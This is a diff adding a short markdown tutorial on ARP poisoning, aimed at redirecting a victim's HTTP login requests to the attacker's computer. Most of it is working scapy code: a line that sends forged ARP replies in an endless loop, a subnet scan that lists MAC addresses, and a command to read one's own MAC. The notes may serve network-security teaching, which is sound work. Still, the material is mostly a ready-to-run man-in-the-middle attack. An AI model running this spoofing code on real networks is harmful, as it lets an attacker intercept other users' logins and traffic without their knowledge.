@@ -1,0 +1,38 @@
+---
+title: ARP poisoning
+---
+
+Suppose victim (IP_V, MAC_V) is logging into a http website that is hosted on (IP_W, MAC_W)
+
+Our goal is to trick the victim that the MAC address of the website is our own computer (MAC_O) MAC address, such that the login requests go to our computer instead of to the website.
+
+We can do this using ARP poisoning, we send ARP "responses" to the victim, that say that MAC_O belongs to IP_W.
+
+We can do this using scapy:
+
+```
+spoofed = eval("Ether(dst='MAC_V', src='MAC_O', type=2054)/ARP(hwtype=1, ptype=2048, hwlen=6, plen=4, op=2, hwsrc='MAC_O', psrc='IP_W', hwdst='MAC_V', pdst='IP_V')")
+sendp(spoofed,iface="eth0",loop=1,inter=0.1)
+```
+
+The MAC addresses MAC_V, MAC_W can be found using:
+
+```python
+from scapy.all import ARP, Ether, srp, conf
+
+conf.verb = 0  # quiet
+iface = "eth0"  # change interface
+network = "192.168.0.0/24" # change subnet
+
+arp = ARP(pdst=network)
+eth = Ether(dst="ff:ff:ff:ff:ff:ff")
+ans, _ = srp(eth/arp, iface=iface, timeout=2)
+
+for snd, rcv in ans:
+    print(f"{rcv.psrc} is at {rcv.hwsrc}")
+```
+
+And our own MAC address can be found using
+```bash
+ip a show eth0
+```
